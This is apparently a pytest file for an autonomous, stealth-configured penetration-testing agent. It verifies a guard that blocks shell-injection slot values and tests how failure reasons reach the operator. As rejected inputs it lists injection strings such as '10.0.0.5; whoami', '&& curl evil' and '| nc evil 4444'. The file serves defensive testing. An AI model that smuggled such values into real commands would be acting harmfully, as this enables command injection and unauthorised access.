"""Execution robustness: a slot value interpolated into a command is a token.

The bug this closes: adapters build command STRINGS with f-strings
(`f"nmap -Pn -sT -p {ports} {target}"`) and the agent executes them through
`execute_quiet`, which runs with shell=True. A slot value carrying a space
therefore arrived as two argv entries (nmap read the second as another flag
— argument injection) and one carrying `;`/`&` became shell syntax. The
agent now refuses the capability with a typed `blocked` reason instead.
"""
import pytest

from phantom.core.safe_exec import unsafe_slot_reason


class TestUnsafeSlotReason:
    @pytest.mark.parametrize("value", [
        "10.0.0.5",
        "10.0.0.0/24",
        "tcp/22",
        "22,80,443",
        "https://host.example.com/a/b?x=1",
        "user@example.com",
        "DOMAIN.local",
        "ssh",
        "GET",
        "CVE-2024-1234",
        "Passw0rd!",
        "a" * 512,
    ])
    def test_plain_tokens_are_accepted(self, value):
        assert unsafe_slot_reason(value) == ""

    @pytest.mark.parametrize("value,marker", [
        ("10.0.0.5 -oN /tmp/pwn", " "),
        ("10.0.0.5; whoami", ";"),
        ("10.0.0.5 && curl evil", "&"),
        ("10.0.0.5 | nc evil 4444", "|"),
        ("$(id)", "$"),
        ("`id`", "`"),
        ("a\nb", " "),
        ("'a'", "'"),
        ("%USERPROFILE%", "%"),
        ("a>b", ">"),
        ("https://host/?a=1&b=2", "&"),
    ])
    def test_shell_metacharacters_are_refused(self, value, marker):
        reason = unsafe_slot_reason(value)
        assert reason, (value, reason)
        assert marker in reason, (value, reason)

    def test_a_url_with_an_ampersand_is_refused_not_silently_broken(self):
        """Honest limitation: an unquoted `&` cannot survive a shell, so the
        capability is refused instead of injected."""
        assert unsafe_slot_reason("http://h/?a=1&b=2") != ""

    def test_oversized_value_is_refused(self):
        assert "longer than" in unsafe_slot_reason("a" * 513)

    @pytest.mark.parametrize("value", [None, True, False, ""])
    def test_inert_values_never_block(self, value):
        assert unsafe_slot_reason(value) == ""

    def test_structured_values_are_left_to_interpreters(self):
        assert unsafe_slot_reason({"a": "b c"}) == ""
        assert unsafe_slot_reason(["a b"]) == ""


class TestAgentRefusesUnsafeSlots:
    """The guard is wired at the ONE place every capability passes through."""

    def _agent(self, events):
        from phantom.automation.agent import AutonomousAgent
        from phantom.automation.belief import WorldModel
        from phantom.automation.guidance.stealth import StealthConfig, StealthEngine
        from phantom.automation.runtime.stealth_runtime import (
            StealthRuntime, TimingGovernor)
        from phantom.automation.runtime.toolchain import ToolRegistry
        from phantom.core.executor import QuietResult

        def _runner(cmd, timeout=60):
            return QuietResult(cmd=cmd, stdout="", stderr="", returncode=0)

        return AutonomousAgent(
            target="10.0.0.5", target_type="ip", profile="enterprise",
            on_event=lambda k, d: events.append((k, d)),
            runtime=StealthRuntime(
                StealthEngine(WorldModel(target="10.0.0.5"),
                              StealthConfig()),
                runner=_runner,
                cost_per_action=0.0,
                governor=TimingGovernor(base_delay=0.0, jitter=0.0)),
            toolchain=ToolRegistry(installed={"nmap", "masscan", "nc", "curl"}),
            scope_list=["10.0.0.0/8"])

    def _step(self, cap_id, slot_values):
        from phantom.automation.guidance.commands import make_registry
        from phantom.automation.planner import PlanStep
        cap = make_registry().get(cap_id)
        return PlanStep(capability=cap, slot_values=dict(slot_values))

    def _cap_with_shell_slot(self):
        """First capability whose inputs name a slot the guard watches."""
        from phantom.automation.agent import _SHELL_SLOT_NAMES
        from phantom.automation.guidance.commands import make_registry
        for cap in make_registry().all():
            for slot in cap.inputs:
                if slot.name in _SHELL_SLOT_NAMES:
                    return cap.id, slot.name
        raise AssertionError("no capability exposes a shell slot")

    def test_unsafe_slot_value_blocks_before_any_execution(self):
        events = []
        agent = self._agent(events)
        cap_id, slot_name = self._cap_with_shell_slot()
        ran = []
        from phantom.core.executor import QuietResult
        agent.runtime.runner = lambda cmd, timeout=60: (
            ran.append(cmd), QuietResult(cmd=cmd, stdout="", returncode=0))[1]

        ok = agent._execute_capability(
            self._step(cap_id, {slot_name: "10.0.0.5; id"}))

        assert ok is False
        assert ran == [], "an unsafe value must never reach the shell"
        blocked = [d for k, d in events if k == "blocked"]
        assert blocked, events
        assert "unsafe slot value" in blocked[0]["reason"]

    def test_clean_value_passes_the_guard(self):
        """No false positive: the guard must not block ordinary tokens."""
        events = []
        agent = self._agent(events)
        cap_id, slot_name = self._cap_with_shell_slot()
        agent._execute_capability(self._step(cap_id, {slot_name: "22"}))
        assert not [d for k, d in events
                    if k == "blocked" and "unsafe slot" in str(d.get("reason"))]


class TestFailureTaxonomy:
    """`QuietResult.error` used to be dropped by the runtime, so "out of
    scope", "tool not installed" and "ran and printed nothing" all reached
    the operator as the same empty "execution failed"."""

    def _runtime(self, result):
        from phantom.automation.belief import WorldModel
        from phantom.automation.guidance.stealth import StealthConfig, StealthEngine
        from phantom.automation.runtime.stealth_runtime import (
            StealthRuntime, TimingGovernor)
        return StealthRuntime(
            StealthEngine(WorldModel(target="10.0.0.5"), StealthConfig()),
            runner=lambda cmd, timeout=60: result,
            cost_per_action=0.0,
            governor=TimingGovernor(base_delay=0.0, jitter=0.0))

    def test_runtime_propagates_the_refusal_reason(self):
        from phantom.core.executor import QuietResult
        runtime = self._runtime(QuietResult(
            cmd="nmap 1.2.3.4", error="out of scope: 1.2.3.4", returncode=-1))
        run = runtime.run("nmap 1.2.3.4")
        assert run.ok is False
        assert run.error == "out of scope: 1.2.3.4"

    def test_runtime_keeps_error_empty_on_success(self):
        from phantom.core.executor import QuietResult
        runtime = self._runtime(QuietResult(cmd="nmap", stdout="ok",
                                            returncode=0))
        run = runtime.run("nmap 1.2.3.4")
        assert run.ok is True
        assert run.error == ""

    def test_agent_emits_a_typed_reason_on_refusal(self):
        from phantom.core.executor import QuietResult
        events = []
        agent = TestAgentRefusesUnsafeSlots()._agent(events)
        agent.runtime.runner = lambda cmd, timeout=60: QuietResult(
            cmd=cmd, error="tool 'evil-winrm' not installed", returncode=-1)
        cap_id, slot_name = TestAgentRefusesUnsafeSlots()._cap_with_shell_slot()
        agent._execute_capability(
            TestAgentRefusesUnsafeSlots()._step(cap_id, {slot_name: "22"}))
        failed = [d for k, d in events if k == "failed"]
        assert failed, events
        assert "refused: tool 'evil-winrm' not installed" == failed[0]["reason"]
